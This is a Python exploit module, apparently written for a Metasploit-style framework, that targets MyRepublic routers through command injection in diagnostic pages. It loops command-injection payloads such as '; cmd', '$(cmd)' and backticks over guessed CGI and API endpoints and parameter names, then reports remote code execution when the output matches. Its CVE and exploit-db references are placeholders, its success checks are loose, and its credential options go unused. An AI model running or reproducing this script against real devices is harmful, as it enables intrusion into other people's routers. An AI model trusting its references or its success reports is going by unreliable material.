#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "MyRepublic Router RCE Exploit",
    "description": "Remote Code Execution in MyRepublic routers via command injection in diagnostic tools",
    "author": "Lazy Framework Team", 
    "license": "MIT",
    "references": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-XXXX",
        "https://www.exploit-db.com/exploits/XXXXX"
    ],
    "platform": "linux",
    "rank": "excellent",
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.1.1"
    },
    "RPORT": {
        "description": "Target router port", 
        "required": False,
        "default": "80"
    },
    "SSL": {
        "description": "Use HTTPS",
        "required": False,
        "default": "false"
    },
    "CMD": {
        "description": "Command to execute on router",
        "required": False,
        "default": "id"
    },
    "USERNAME": {
        "description": "Admin username",
        "required": False,
        "default": "admin"
    },
    "PASSWORD": {
        "description": "Admin password",
        "required": False, 
        "default": "admin"
    }
}

def run(session, options):
    import requests
    import urllib3
    from rich.console import Console
    from rich.panel import Panel
    
    console = Console()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80") 
    use_ssl = options.get("SSL", "false").lower() == "true"
    cmd = options.get("CMD", "id")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    
    protocol = "https" if use_ssl else "http"
    base_url = f"{protocol}://{rhost}:{rport}"
    
    console.print(Panel.fit(
        f"[bold red]MyRepublic Router RCE Exploit[/bold red]\n"
        f"Target: {base_url}\n"
        f"Command: {cmd}",
        style="red"
    ))
    
    # Common RCE endpoints in routers
    rce_endpoints = [
        "/cgi-bin/luci/admin/network/diagnostic",
        "/api/network/ping",
        "/api/system/traceroute", 
        "/cgi-bin/diagnostic.cgi",
        "/goform/diagnostic",
        "/cgi-bin/ping.cgi",
        "/cgi-bin/traceroute.cgi",
        "/api/diagnostic/ping"
    ]
    
    # Command injection payloads
    injection_payloads = [
        f"127.0.0.1; {cmd}",
        f"127.0.0.1 && {cmd}",
        f"127.0.0.1 | {cmd}",
        f"`{cmd}`",
        f"$({cmd})",
        f"127.0.0.1 || {cmd}",
        f";{cmd};",
        f"|{cmd}|",
        f"&&{cmd}&&"
    ]
    
    successful_rce = []
    
    for endpoint in rce_endpoints:
        console.print(f"\n[bold yellow]Testing endpoint: {endpoint}[/bold yellow]")
        
        for payload in injection_payloads:
            try:
                url = f"{base_url}{endpoint}"
                
                # Common parameter names
                params = {
                    "ping_address": payload,
                    "host": payload, 
                    "address": payload,
                    "ip": payload,
                    "target": payload,
                    "hostname": payload
                }
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                # Try both POST and GET
                for method in [requests.post, requests.get]:
                    try:
                        if method == requests.post:
                            response = method(url, data=params, headers=headers, verify=False, timeout=10)
                        else:
                            response = method(url, params=params, headers=headers, verify=False, timeout=10)
                        
                        # Check for command output in response
                        if response.status_code == 200:
                            # Common success indicators in command output
                            success_indicators = [
                                "uid=" in response.text,  # id command
                                "root" in response.text,
                                "bin" in response.text,
                                "www-data" in response.text,
                                "success" in response.text.lower(),
                                len(response.text) > 1000  # Large response might contain output
                            ]
                            
                            if any(success_indicators):
                                console.print(f"[green]✓ RCE SUCCESS: {endpoint}[/green]")
                                console.print(f"[green]Payload: {payload}[/green]")
                                
                                successful_rce.append({
                                    "endpoint": endpoint,
                                    "payload": payload,
                                    "method": method.__name__,
                                    "response": response.text[:500] + "..." if len(response.text) > 500 else response.text
                                })
                                
                                # Show command output
                                console.print(Panel(
                                    response.text,
                                    title=f"Command Output - {cmd}",
                                    style="green"
                                ))
                                break
                                
                    except requests.exceptions.RequestException:
                        continue
                        
            except Exception as e:
                console.print(f"[red]Error: {str(e)}[/red]")
                continue
    
    if not successful_rce:
        console.print(Panel.fit(
            "[bold red]No successful RCE attempts[/bold red]\n"
            "Try manual authentication first, then use authenticated RCE endpoints.",
            style="red"
        ))
